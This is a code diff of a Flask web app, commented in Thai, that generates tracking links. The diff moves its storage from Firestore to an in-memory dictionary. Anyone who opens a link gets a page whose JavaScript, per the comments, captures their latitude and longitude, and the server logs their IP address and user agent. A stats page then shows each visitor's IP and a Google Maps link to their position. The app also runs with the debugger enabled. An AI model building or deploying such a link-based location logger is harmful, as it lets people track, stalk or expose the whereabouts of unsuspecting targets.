@@ -1,18 +1,15 @@
 import uuid
-from firebase_admin import credentials, firestore, initialize_app
-from firebase_functions import https_fn
 from flask import Flask, jsonify, redirect, request, url_for
 
-initialize_app()
-db = firestore.client()
-
 app = Flask(__name__)
+
+# เก็บข้อมูลไว้ในหน่วยความจำ (Memory Storage)
+links_db = {}
 
 
 @app.route("/")
 def home():
-    links_ref = db.collection("links").stream()
-    links_list = [doc.id for doc in links_ref]
+    links_list = list(links_db.keys())
 
     links_html = "".join(
         [
@@ -38,18 +35,17 @@ def home():
 def create_link():
     """สร้าง Unique Link ID ใหม่ด้วย UUID"""
     unique_id = str(uuid.uuid4())[:8]
-    db.collection("links").document(unique_id).set({"created_at": firestore.SERVER_TIMESTAMP})
+    # เพิ่มเติม: เปลี่ยนการบันทึกข้อมูลจาก Firebase มาเก็บใน links_db (dict)
+    links_db[unique_id] = []
     return redirect(url_for("home"))
 
 
 @app.route("/track/<link_id>")
 def track_session(link_id):
     """เมื่อมีคนกดเข้าลิงก์นี้ ระบบจะรัน JavaScript ดึงพิกัด Lat/Long แล้วบันทึก"""
-    doc_ref = db.collection("links").document(link_id).get()
-    if not doc_ref.exists:
+    if link_id not in links_db:
         return "ไม่พบลิงก์นี้ในระบบ", 404
 
-    # เพิ่มเติม: หน้า HTML + JavaScript ดึงพิกัด Geolocation ส่งกลับมาหา Server ก่อน Redirect
     return f"""
     <!DOCTYPE html>
     <html>
@@ -96,8 +92,7 @@ def track_session(link_id):
 @app.route("/save-location/<link_id>", methods=["POST"])
 def save_location(link_id):
     """เพิ่มเติม: API สำหรับรับค่า IP, User Agent และ พิกัด Lat/Long มาบันทึก"""
-    doc_ref = db.collection("links").document(link_id).get()
-    if not doc_ref.exists:
+    if link_id not in links_db:
         return jsonify({"status": "error"}), 404
 
     data = request.get_json() or {}
@@ -109,18 +104,17 @@ def save_location(link_id):
         "user_agent": user_agent,
         "latitude": data.get("latitude"),
         "longitude": data.get("longitude"),
-        "timestamp": firestore.SERVER_TIMESTAMP,
     }
 
-    db.collection("links").document(link_id).collection("visits").add(visit_data)
+    # เพิ่มเติม: บันทึกข้อมูลประวัติการเข้าชมลงใน links_db
+    links_db[link_id].append(visit_data)
     return jsonify({"status": "success"})
 
 
 @app.route("/success/<link_id>")
 def track_success(link_id):
     """เพิ่มเติม: หน้าแสดงผลลัพธ์หลังบันทึกข้อมูลเสร็จสิ้น ป้องกันปัญหาหน้าขาว"""
-    doc_ref = db.collection("links").document(link_id).get()
-    if not doc_ref.exists:
+    if link_id not in links_db:
         return "ไม่พบลิงก์นี้ในระบบ", 404
 
     user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -135,14 +129,12 @@ def track_success(link_id):
 @app.route("/stats/<link_id>")
 def view_stats(link_id):
     """หน้าสำหรับดูประวัติว่ามี IP ไหนเคยเข้าผ่านลิงก์นี้บ้าง พร้อมพิกัดแผนที่"""
-    doc_ref = db.collection("links").document(link_id).get()
-    if not doc_ref.exists:
+    if link_id not in links_db:
         return "ไม่พบลิงก์นี้ในระบบ", 404
 
-    visits_ref = db.collection("links").document(link_id).collection("visits").stream()
-    visits = [doc.to_dict() for doc in visits_ref]
+    # เพิ่มเติม: ดึงรายการการเข้าชมจาก links_db
+    visits = links_db[link_id]
 
-    # เพิ่มเติม: สกัดค่า Latitude, Longitude และสร้างลิงก์สำหรับเปิดดูใน Google Maps
     rows_list = []
     for visit in visits:
         lat = visit.get("latitude")
@@ -164,7 +156,6 @@ def view_stats(link_id):
         )
 
     rows = "".join(rows_list)
-    # เพิ่มเติม: แก้ไขแท็ก HTML จาก 2> เป็น <h2>
     return f"""
     <h2>สถิติการเข้าชมของ Link ID: {link_id}</h2>
     <p>จำนวนการเข้าชมทั้งหมด: {len(visits)} ครั้ง</p>
@@ -181,7 +172,5 @@ def view_stats(link_id):
     """
 
 
-@https_fn.on_request()
-def flask_app(req: https_fn.Request) -> https_fn.Response:
-    with app.request_context(req.environ):
-        return app.full_dispatch_request()
+if __name__ == "__main__":
+    app.run(debug=True)
